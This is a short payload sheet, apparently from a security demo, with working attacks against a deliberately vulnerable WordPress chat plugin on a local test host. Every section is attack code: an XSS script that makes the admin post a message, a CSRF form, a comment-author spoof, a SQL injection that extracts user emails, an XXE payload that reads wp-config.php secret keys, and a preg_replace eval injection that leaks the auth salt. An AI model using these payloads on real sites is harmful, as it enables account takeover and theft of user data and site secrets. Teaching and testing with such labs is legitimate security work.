Make admin say something
========================

XSS
---

```js
haX0R = true;
```

```html
<script>
(function() {
	if ( 'undefined' !== typeof haX0R ) {
		return;
	}

	jQuery( '.widget_chat_sploit textarea' ).val( 'I am lame HAHAHA' );

	jQuery( '.widget_chat_sploit form' ).submit();
})()
</script>
```

CSRF
----

```html
<form enctype="text/plain" action="http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit" method="POST">
	<input type="hidden" name="&lt;chat&gt;" value="Hello&lt;/chat&gt;" />
	<input type="submit" value="Hot mdawaffe pics!" />
</form>
```

Spoof
-----

```bash
curl -i 'http://hacek.local/wordpress/wp-comments-post.php' --form 'comment=Hi' --form 'author=admin' --form 'email=test@example.com' --form 'comment_post_ID=12187'
```

Get list of all users' email adresses
=====================================

SQL Injection
-------------

```bash
curl -i 'http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit&since=2013-04-18+05:33:47%27+UNION+SELECT+user_login+AS+author%2C+user_email+AS+text%2C+0+AS+time+FROM+wp2_users+--+'
```

Get the site's SECRET_KEYs
=========================

XXE
---

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [<!ENTITY hi SYSTEM "php://filter/read=convert.base64-encode/resource=file:///Users/mdawaffe/Sites/wp-config.php"> ]>
<chat>&hi;</chat>
```

```bash
cat xxe.xml | curl "http://hacek.local/wordpress/wp-admin/admin-ajax.php?action=chatsploit" -H "Cookie: wordpress_97bd8bf7ee22f9417a72a1ea2e1d6871=author%7C1366426304%7C8fad75c62a8b4bfac050244f094c1084; wordpress_logged_in_97bd8bf7ee22f9417a72a1ea2e1d6871=author%7C1366426304%7C4ae3cc62335b75ef19bb1f812050c654;" --data @-
```

Get the site's SECRET_SALTs
===========================

`PREG_REPLACE_EVAL`
-------------------

```
hello http://example.com/{${substr(a.($a=get_option(auth_salt)),0,1)}} there
```
